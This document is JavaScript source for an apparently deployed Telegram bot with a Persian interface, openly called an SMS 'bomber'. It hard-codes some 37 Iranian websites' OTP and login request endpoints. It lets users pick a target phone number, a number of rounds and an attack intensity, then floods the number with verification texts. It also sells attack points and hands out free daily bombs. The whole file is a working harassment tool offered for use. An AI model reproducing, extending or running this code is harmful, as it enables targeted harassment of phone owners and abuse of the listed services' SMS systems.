const ADMIN_ID = 6887901539;

const SERVICES = {
  divar: (p) => fetch('https://api.divar.ir/v5/auth/authenticate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  sheypoor: (p) => fetch('https://www.sheypoor.com/api/v1/auth/otp/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  digikala: (p) => fetch('https://api.digikala.com/v1/user/otp/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: p.replace('+98', '0')}) }),
  snapp: (p) => fetch('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p}) }),
  tapsi: (p) => fetch('https://api.tapsi.ir/api/v2.2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: p.replace('+98', '0'), role: 'PASSENGER'}, otpOption: 'SMS'}) }),
  alibaba: (p) => fetch('https://ws.alibaba.ir/api/v3/account/mobile/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) }),
  torob: (p) => fetch(`https://api.torob.com/a/phone/send-pin/?phone_number=${p.replace('+98', '0')}`, { method: 'GET' }),
  basalam: (p) => fetch('https://api.basalam.com/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({query: "mutation { mobileVerificationCodeRequest(mobile: \"" + p.replace('+98', '0') + "\") { success } }"}) }),
  digikala_jet: (p) => fetch('https://api.digikalajet.ir/user/login-register/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  mobit: (p) => fetch('https://api.mobit.ir/api/web/v8/register/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p.replace('+98', '0')}) }),
  ghabzino: (p) => fetch('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({Parameters: {MobileNumber: p.replace('+98', '0')}}) }),
  namava: (p) => fetch('https://www.namava.ir/api/v1.0/accounts/registrations/by-mobile/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({UserName: p.replace('+98', '0')}) }),
  idpay: (p) => fetch('https://idpay.ir/api/v1/auth/send-otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  snapfood: (p) => fetch('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p.replace('+98', '0')}) }),
  filmnet: (p) => fetch(`https://api-v2.filmnet.ir/access-token/users/${p.replace('+98', '0')}/otp`, { method: 'GET' }),
  alopeyk: (p) => fetch('https://api.alopeyk.com/api/v2/login?platform=pwa', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type: "CUSTOMER", phone: p.replace('+98', '')}) }),
  snapp_express: (p) => fetch('https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `cellphone=${p.replace('+98', '0')}` }),
  azki: (p) => fetch('https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) }),
  ostadkar: (p) => fetch('https://api.ostadkr.com/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  miare: (p) => fetch('https://www.miare.ir/api/otp/driver/request/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone_number: p.replace('+98', '0')}) }),
  banimode: (p) => fetch('https://mobapi.banimode.com/api/v2/auth/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  taaghche: (p) => fetch('https://gw.taaghche.com/v4/site/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({contact: p.replace('+98', '0'), forceOtp: false}) }),
  jabama: (p) => fetch('https://taraazws.jabama.com/api/v4/account/send-code', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  komodaa: (p) => fetch('https://api.komodaa.com/api/v2.6/loginRC/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone_number: p.replace('+98', '0')}) }),
  barghe_man: (p) => fetch('https://uiapi2.saapa.ir/api/otp/sendCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  vandar: (p) => fetch('https://api.vandar.io/account/v1/check/mobile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  pinorest: (p) => fetch('https://api.pinorest.com/frontend/auth/login/mobile', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  tetherland: (p) => fetch('https://service.tetherland.com/api/v5/login-register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  drdr: (p) => fetch('https://drdr.ir/api/v3/auth/login/mobile/init', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  drnext: (p) => fetch('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  classino: (p) => fetch('https://student.classino.com/otp/v1/api/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  gap: (p) => fetch(`https://core.gap.im/v1/user/add.json?phone=${p.split('+')[1]}`, { method: 'GET' }),
  tbourse: (p) => fetch('https://api.irantbours.com:443/api/v1/access/join/mobile/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  itoll: (p) => fetch('https://app.itoll.com/api/v1/auth/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  flightio: (p) => fetch('https://flightio.com/api/v2.2/customer/authentication/otp/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  snapptrip: (p) => fetch('https://www.snapptrip.com/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile_phone: p.replace('+98', '0')}) }),
  nobatir: (p) => fetch('https://nobat.ir/api/public/patient/login/phone', { method: 'POST', headers: {'Content-Type': 'multipart/form-data; boundary=----'}, body: `------\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n${p.replace('+98', '0')}\r\n------\r\n` })
};

const userStates = new Map();
const userPoints = new Map();
const userDailyReward = new Map();
const userFreeBomb = new Map();
const userBlacklist = new Map();
const userAttacks = new Map();
const userTotalSms = new Map();

let lastUpdate = null;
let lastUpdateTime = null;
let updateCount = 0;

function normalizePhone(phone) {
  let cleaned = phone.replace(/[^\d+]/g, '');
  if (cleaned.startsWith("09")) return "+98" + cleaned.substring(1);
  if (cleaned.startsWith("9")) return "+98" + cleaned;
  if (cleaned.startsWith("+98")) return cleaned;
  return null;
}

async function sendMessage(token, chatId, text, replyMarkup = null) {
  const payload = { chat_id: chatId, text: text, parse_mode: "Markdown" };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return await response.json();
  } catch (e) {
    console.error("Send Error:", e);
  }
}

async function editMessage(token, chatId, messageId, text, replyMarkup = null) {
  const payload = { chat_id: chatId, message_id: messageId, text: text, parse_mode: "Markdown" };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return await response.json();
  } catch (e) {
    console.error("Edit Error:", e);
  }
}

// ==================== کیبوردها (Reply Keyboard) ====================

function mainKeypad() {
  return {
    keyboard: [
      [{ text: "💣 شروع عملیات جدید" }],
      [{ text: "🎁 بمبر رایگان" }],
      [{ text: "📊 آمار من" }, { text: "⭐ امتیازات من" }],
      [{ text: "🎁 پاداش روزانه" }],
      [{ text: "🔗 لینک ارجاع" }, { text: "🔑 کد دعوت" }],
      [{ text: "💰 خرید امتیاز" }],
      [{ text: "🛡 لیست سیاه شخصی" }],
      [{ text: "📢 کانال ما" }, { text: "❓ راهنما" }]
    ],
    resize_keyboard: true
  };
}

function backKeypad() {
  return {
    keyboard: [[{ text: "↪️ بازگشت به منوی اصلی" }]],
    resize_keyboard: true
  };
}

function roundsKeypad() {
  return {
    keyboard: [
      [{ text: "۱ دور" }, { text: "۲ دور" }, { text: "۳ دور" }],
      [{ text: "۵ دور" }, { text: "۱۰ دور" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function intensityKeypad() {
  return {
    keyboard: [
      [{ text: "⚡️⚡️ خیلی سریع" }, { text: "🔥🔥 فوق سریع" }],
      [{ text: "💀💀 مرگبار" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function confirmKeypad() {
  return {
    keyboard: [
      [{ text: "✅ تایید و شروع حمله" }],
      [{ text: "❌ لغو و بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function adminKeypad() {
  return {
    keyboard: [
      [{ text: "📊 آمار کلی" }],
      [{ text: "👥 مدیریت کاربران" }],
      [{ text: "⭐ افزودن امتیاز" }],
      [{ text: "👑 پنل مالک" }],
      [{ text: "🛡 لیست سیاه مالک" }],
      [{ text: "🔒 امنیت و وب‌سرویس" }],
      [{ text: "↪️ خروج" }]
    ],
    resize_keyboard: true
  };
}

function buyKeypad() {
  return {
    keyboard: [
      [{ text: "10⭐ = 20ت" }, { text: "20⭐ = 40ت" }, { text: "30⭐ = 60ت" }],
      [{ text: "40⭐ = 80ت" }, { text: "50⭐ = 100ت" }],
      [{ text: "100⭐ = 150ت" }, { text: "200⭐ = 300ت" }, { text: "300⭐ = 450ت" }],
      [{ text: "400⭐ = 600ت" }, { text: "500⭐+100⭐ = 700ت" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

function referralKeypad() {
  return {
    keyboard: [
      [{ text: "📊 آمار ارجاع" }, { text: "💰 خرید امتیاز" }],
      [{ text: "🔑 وارد کردن کد دعوت" }],
      [{ text: "↪️ بازگشت" }]
    ],
    resize_keyboard: true
  };
}

// ==================== هندلر اصلی ====================
export default {
  async fetch(request, env) {

    if (request.method === "GET") {
      const url = new URL(request.url);
      
      if (url.pathname === "/debug") {
        return new Response(JSON.stringify({
          lastUpdate: lastUpdate,
          lastUpdateTime: lastUpdateTime,
          updateCount: updateCount,
          message: "آخرین آپدیت دریافتی از تلگرام"
        }, null, 2), {
          headers: { "Content-Type": "application/json" }
        });
      }
      
      if (url.pathname === "/clear") {
        lastUpdate = null;
        lastUpdateTime = null;
        return new Response("✅ پاک شد");
      }
      
      return new Response("🤖 Telegram Bomber Webhook Active ✅\n\n/debug - دیدن آخرین آپدیت\n/clear - پاک کردن");
    }

    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405 });
    }

    try {
      const update = await request.json();
      
      lastUpdate = update;
      lastUpdateTime = new Date().toISOString();
      updateCount++;
      
      console.log("===== TELEGRAM UPDATE =====");
      console.log(JSON.stringify(update));
      console.log("=========================");

      let chatId = null;
      let text = "";
      let userId = null;
      
      if (update.message) {
        chatId = update.message.chat.id;
        text = update.message.text || "";
        userId = update.message.from.id;
      }
      
      console.log("CHAT:", chatId);
      console.log("TEXT:", text);
      console.log("USER:", userId);

      if (!chatId) {
        return new Response("OK");
      }

      const state = userStates.get(chatId) || {};
      const points = userPoints.get(chatId) || 3;
      const isAdmin = userId === ADMIN_ID;

      // ==================== بازگشت به منو ====================
      if (text === "↪️ بازگشت به منوی اصلی" || text === "↪️ بازگشت" || text === "❌ لغو و بازگشت" || text === "↪️ خروج") {
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId, "💣 به منوی اصلی برگشتید!", mainKeypad());
        return new Response("OK");
      }

      // ==================== /start ====================
      if (text === "/start") {
        userStates.delete(chatId);
        if (!userPoints.has(chatId)) {
          userPoints.set(chatId, 3);
        }
        await sendMessage(env.TOKEN, chatId,
          "🎉 سلام!\n\n" +
          "🤖 به ربات Bomber خوش آمدید!\n\n" +
          "⭐ امتیاز فعلی: " + points + "\n\n" +
          "💣 برای شروع از منوی زیر استفاده کنید:",
          mainKeypad());
        return new Response("OK");
      }

      // ==================== پنل ادمین ====================
      if (text === "shayan9229292" && isAdmin) {
        await sendMessage(env.TOKEN, chatId, "👑 به پنل مدیریت خوش آمدید:", adminKeypad());
        return new Response("OK");
      }

      if (text === "📊 آمار کلی" && isAdmin) {
        let totalPoints = 0;
        for (const pts of userPoints.values()) totalPoints += pts;
        await sendMessage(env.TOKEN, chatId,
          "📊 آمار کلی\n\n" +
          "👥 کاربران: " + userPoints.size + "\n" +
          "⭐ مجموع امتیازات: " + totalPoints + "\n" +
          "⚔️ سرویس‌ها: " + Object.keys(SERVICES).length,
          adminKeypad());
        return new Response("OK");
      }

      if (text === "⭐ افزودن امتیاز" && isAdmin) {
        userStates.set(chatId, { state: "add_points" });
        await sendMessage(env.TOKEN, chatId, 
          "⭐ فرمت:\n`chat_id|amount`\n\nمثال:\n`6887901539|10`",
          backKeypad());
        return new Response("OK");
      }

      if (state.state === "add_points" && isAdmin) {
        const parts = text.split('|');
        if (parts.length === 2) {
          const targetId = parseInt(parts[0].trim());
          const amount = parseInt(parts[1].trim());
          if (!isNaN(amount) && !isNaN(targetId)) {
            const current = userPoints.get(targetId) || 0;
            userPoints.set(targetId, current + amount);
            await sendMessage(env.TOKEN, chatId,
              "✅ " + amount + " امتیاز اضافه شد\n\n⭐ جدید: " + (current + amount),
              adminKeypad());
            userStates.delete(chatId);
            return new Response("OK");
          }
        }
        await sendMessage(env.TOKEN, chatId, "❌ فرمت اشتباه!", backKeypad());
        return new Response("OK");
      }

      // ==================== دکمه‌های منو ====================

      if (text === "💣 شروع عملیات جدید") {
        if (points <= 0) {
          await sendMessage(env.TOKEN, chatId, 
            "⚠️ امتیاز کافی ندارید!\n\n⭐ امتیاز فعلی: " + points + "\n\n🎁 پاداش روزانه بگیرید",
            mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { state: "awaiting_phone" });
        await sendMessage(env.TOKEN, chatId, 
          "📞 شماره تلفن هدف را وارد کنید:\n\nمثال: `09123456789`",
          backKeypad());
        return new Response("OK");
      }

      if (text === "🎁 بمبر رایگان") {
        const lastFree = userFreeBomb.get(chatId);
        if (lastFree && Date.now() - lastFree < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastFree)) / (60 * 60 * 1000));
          await sendMessage(env.TOKEN, chatId, 
            "⏳ هنوز 24 ساعت نگذشته!\n\n⏰ " + remaining + " ساعت دیگر",
            mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { state: "awaiting_free_bomb" });
        await sendMessage(env.TOKEN, chatId, 
          "🎁 بمبر رایگان فعال شد!\n\n📞 شماره هدف را وارد کنید:\n(5 سرویس تصادفی)",
          backKeypad());
        return new Response("OK");
      }

      if (text === "📊 آمار من") {
        const attacks = userAttacks.get(chatId) || 0;
        const totalSms = userTotalSms.get(chatId) || 0;
        await sendMessage(env.TOKEN, chatId,
          "📊 آمار شما\n\n" +
          "🆔 آیدی: `" + chatId + "`\n" +
          "⭐ امتیاز: " + points + "\n" +
          "💣 حملات: " + attacks + "\n" +
          "✉️ پیامک موفق: " + totalSms,
          mainKeypad());
        return new Response("OK");
      }

      if (text === "⭐ امتیازات من") {
        await sendMessage(env.TOKEN, chatId,
          "⭐ امتیازات شما\n\n" +
          "امتیاز فعلی: " + points + "\n\n" +
          "💡 هر عملیات = 1 امتیاز\n" +
          "🎁 پاداش روزانه = 3 امتیاز\n" +
          "🔗 هر دعوت = 1 امتیاز",
          mainKeypad());
        return new Response("OK");
      }

      if (text === "🎁 پاداش روزانه") {
        const lastDaily = userDailyReward.get(chatId);
        if (lastDaily && Date.now() - lastDaily < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastDaily)) / (60 * 60 * 1000));
          await sendMessage(env.TOKEN, chatId, 
            "⏳ هنوز 24 ساعت نگذشته!\n\n⏰ " + remaining + " ساعت دیگر",
            mainKeypad());
          return new Response("OK");
        }
        userPoints.set(chatId, points + 3);
        userDailyReward.set(chatId, Date.now());
        await sendMessage(env.TOKEN, chatId, 
          "✅ 3 امتیاز دریافت کردید!\n\n⭐ امتیاز فعلی: " + (points + 3),
          mainKeypad());
        return new Response("OK");
      }

      if (text === "🔗 لینک ارجاع") {
        const code = chatId.toString().slice(-8).toUpperCase();
        const link = "https://t.me/YourBotBot?start=ref_" + code;
        await sendMessage(env.TOKEN, chatId,
          "🔗 لینک ارجاع شما:\n`" + link + "`\n\n" +
          "🔑 کد دعوت: `" + code + "`\n\n" +
          "هر کاربر جدید = 1 امتیاز!",
          referralKeypad());
        return new Response("OK");
      }

      if (text === "💰 خرید امتیاز") {
        await sendMessage(env.TOKEN, chatId,
          "💰 خرید امتیاز\n\n" +
          "📋 لیست قیمت‌ها:\n\n" +
          "10⭐ = 20ت | 20⭐ = 40ت | 30⭐ = 60ت\n" +
          "40⭐ = 80ت | 50⭐ = 100ت\n" +
          "100⭐ = 150ت | 200⭐ = 300ت | 300⭐ = 450ت\n" +
          "400⭐ = 600ت | 500⭐+100⭐ = 700ت\n\n" +
          "📞 برای خرید با ادمین تماس بگیرید:\n@ALI_ARMINEH_xLaX",
          buyKeypad());
        return new Response("OK");
      }

      if (text === "🛡 لیست سیاه شخصی") {
        userStates.set(chatId, { state: "awaiting_blacklist" });
        await sendMessage(env.TOKEN, chatId,
          "🛡 شماره‌ای که می‌خواهید در لیست سیاه قرار گیرد را وارد کنید.\n\nاین شماره دیگر قابل حمله نخواهد بود.",
          backKeypad());
        return new Response("OK");
      }

      if (text === "📢 کانال ما") {
        await sendMessage(env.TOKEN, chatId,
          "📢 کانال ما:\n\n@ALI_ARMINEH_COM\n\n💬 گپ:\nhttps://rubika.ir/join/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ",
          mainKeypad());
        return new Response("OK");
      }

      if (text === "❓ راهنما") {
        await sendMessage(env.TOKEN, chatId,
          "❓ راهنمای کامل ربات\n\n" +
          "💣 شروع عملیات: بمباران شماره\n" +
          "🎁 بمبر رایگان: هر 24 ساعت\n" +
          "🎁 پاداش روزانه: 3 امتیاز\n" +
          "⭐ امتیازات: مشاهده امتیاز\n" +
          "🔗 لینک ارجاع: دعوت دوستان\n" +
          "💰 خرید امتیاز: پکیج‌های مختلف\n" +
          "🛡 لیست سیاه: محافظت از شماره\n\n" +
          "💡 هر عملیات 1 امتیاز مصرف می‌کند",
          mainKeypad());
        return new Response("OK");
      }

      // ==================== ورودی‌های متنی ====================

      // دریافت شماره برای بمباران
      if (state.state === "awaiting_phone") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, 
            "❌ شماره نامعتبر!\n\nمثال: `09123456789`",
            backKeypad());
          return new Response("OK");
        }
        
        // چک لیست سیاه
        const blacklist = userBlacklist.get(chatId) || [];
        if (blacklist.includes(phone)) {
          await sendMessage(env.TOKEN, chatId, "🛡 این شماره در لیست سیاه شماست!", backKeypad());
          return new Response("OK");
        }
        
        userStates.set(chatId, { ...state, state: "awaiting_rounds", phone: phone });
        await sendMessage(env.TOKEN, chatId,
          "✅ شماره تایید شد: `" + phone + "`\n\n🔄 تعداد دور را انتخاب کنید:",
          roundsKeypad());
        return new Response("OK");
      }

      // انتخاب دور
      if (state.state === "awaiting_rounds") {
        const roundsMap = {
          "۱ دور": 1, "۲ دور": 2, "۳ دور": 3, "۵ دور": 5, "۱۰ دور": 10,
          "1 دور": 1, "2 دور": 2, "3 دور": 3, "5 دور": 5, "10 دور": 10
        };
        const rounds = roundsMap[text];
        
        if (!rounds) {
          await sendMessage(env.TOKEN, chatId, "❌ لطفاً یکی از گزینه‌ها را انتخاب کنید!", roundsKeypad());
          return new Response("OK");
        }
        
        userStates.set(chatId, { ...state, state: "awaiting_intensity", rounds: rounds });
        await sendMessage(env.TOKEN, chatId, "⚡️ شدت حمله را انتخاب کنید:", intensityKeypad());
        return new Response("OK");
      }

      // انتخاب شدت
      if (state.state === "awaiting_intensity") {
        const delayMap = {
          "⚡️⚡️ خیلی سریع": 0.1,
          "🔥🔥 فوق سریع": 0.05,
          "💀💀 مرگبار": 0.01
        };
        const delay = delayMap[text];
        
        if (delay === undefined) {
          await sendMessage(env.TOKEN, chatId, "❌ لطفاً یکی از گزینه‌ها را انتخاب کنید!", intensityKeypad());
          return new Response("OK");
        }
        
        userStates.set(chatId, { ...state, state: "awaiting_confirm", delay: delay });
        await sendMessage(env.TOKEN, chatId,
          "📋 خلاصه عملیات:\n\n" +
          "📱 هدف: `" + state.phone + "`\n" +
          "🔄 دور: " + state.rounds + "\n" +
          "⚡️ شدت: " + text + "\n\n" +
          "✅ برای شروع یا ❌ برای لغو",
          confirmKeypad());
        return new Response("OK");
      }

      // تایید و شروع حمله
      if (text === "✅ تایید و شروع حمله" && state.state === "awaiting_confirm") {
        const currentPoints = userPoints.get(chatId) || 0;
        if (currentPoints <= 0) {
          await sendMessage(env.TOKEN, chatId, "⚠️ امتیاز کافی ندارید!", mainKeypad());
          userStates.delete(chatId);
          return new Response("OK");
        }
        
        userPoints.set(chatId, currentPoints - 1);
        userAttacks.set(chatId, (userAttacks.get(chatId) || 0) + 1);
        
        const result = await sendMessage(env.TOKEN, chatId, 
          "⏳ در حال آماده‌سازی...\n\n" +
          "📱 هدف: `" + state.phone + "`\n" +
          "🔄 دور: 1/" + state.rounds
        );
        
        const msgId = result?.result?.message_id;
        
        // اجرای بمباران
        const serviceKeys = Object.keys(SERVICES);
        let successCount = 0;
        let failCount = 0;
        
        for (let round = 1; round <= Math.min(state.rounds, 3); round++) {
          for (const serviceName of serviceKeys) {
            try {
              const response = await SERVICES[serviceName](state.phone);
              if (response && (response.ok || response.status === 200 || response.status === 201)) {
                successCount++;
              } else {
                failCount++;
              }
            } catch (e) {
              failCount++;
            }
            
            // آپدیت هر 10 درخواست
            if ((successCount + failCount) % 10 === 0 && msgId) {
              await editMessage(env.TOKEN, chatId, msgId,
                `🎯 در حال بمباران...\n\n` +
                `📱 هدف: \`${state.phone}\`\n` +
                `🔄 دور: ${round}/${state.rounds}\n` +
                `✅ موفق: ${successCount}\n` +
                `❌ ناموفق: ${failCount}`
              );
            }
            
            await new Promise(r => setTimeout(r, 50));
          }
        }
        
        userTotalSms.set(chatId, (userTotalSms.get(chatId) || 0) + successCount);
        
        if (msgId) {
          await editMessage(env.TOKEN, chatId, msgId,
            `✅ عملیات تمام شد!\n\n` +
            `📱 هدف: \`${state.phone}\`\n` +
            `🔄 دورها: ${state.rounds}\n` +
            `✅ موفق: ${successCount}\n` +
            `❌ ناموفق: ${failCount}\n\n` +
            `⭐ امتیاز باقی‌مانده: ${currentPoints - 1}`
          );
        }
        
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
        return new Response("OK");
      }

      // بمبر رایگان
      if (state.state === "awaiting_free_bomb") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, "❌ شماره نامعتبر!", backKeypad());
          return new Response("OK");
        }
        
        userFreeBomb.set(chatId, Date.now());
        
        const result = await sendMessage(env.TOKEN, chatId, 
          "🎯 شروع بمبر رایگان...\n\n📱 هدف: `" + phone + "`"
        );
        
        const msgId = result?.result?.message_id;
        
        const serviceKeys = Object.keys(SERVICES);
        const selectedServices = serviceKeys.sort(() => 0.5 - Math.random()).slice(0, 10);
        
        let successCount = 0;
        let failCount = 0;
        
        for (const serviceName of selectedServices) {
          try {
            const response = await SERVICES[serviceName](phone);
            if (response && (response.ok || response.status === 200 || response.status === 201)) {
              successCount++;
            } else {
              failCount++;
            }
          } catch (e) {
            failCount++;
          }
        }
        
        if (msgId) {
          await editMessage(env.TOKEN, chatId, msgId,
            "✅ بمبر رایگان تمام شد!\n\n" +
            "📱 هدف: `" + phone + "`\n" +
            "✅ موفق: " + successCount + "\n" +
            "❌ ناموفق: " + failCount
          );
        }
        
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
        return new Response("OK");
      }

      // لیست سیاه
      if (state.state === "awaiting_blacklist") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, "❌ شماره نامعتبر!", backKeypad());
          return new Response("OK");
        }
        
        const blacklist = userBlacklist.get(chatId) || [];
        if (!blacklist.includes(phone)) {
          blacklist.push(phone);
          userBlacklist.set(chatId, blacklist);
        }
        
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId, 
          "✅ شماره `" + phone + "` به لیست سیاه اضافه شد!\n\n🛡 تعداد: " + blacklist.length,
          mainKeypad());
        return new Response("OK");
      }

      // پیام پیش‌فرض
      await sendMessage(env.TOKEN, chatId, 
        "❓ دستور نامفهوم\n\nاز منوی زیر استفاده کنید:",
        mainKeypad());
      
      return new Response("OK");

    } catch (error) {
      console.error("❌ ERROR:", error);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};
